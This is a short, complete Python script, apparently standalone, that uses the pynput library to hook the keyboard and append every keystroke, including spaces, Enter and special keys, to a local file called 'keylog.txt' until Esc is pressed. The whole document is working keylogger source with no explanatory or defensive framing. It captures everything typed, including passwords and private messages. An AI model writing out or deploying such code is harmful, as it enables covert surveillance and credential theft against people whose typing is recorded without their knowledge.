import pynput
from pynput.keyboard import Key, Listener

# File to save the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Record the key pressed and append it to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop listener on pressing 'Esc'
    if key == Key.esc:
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
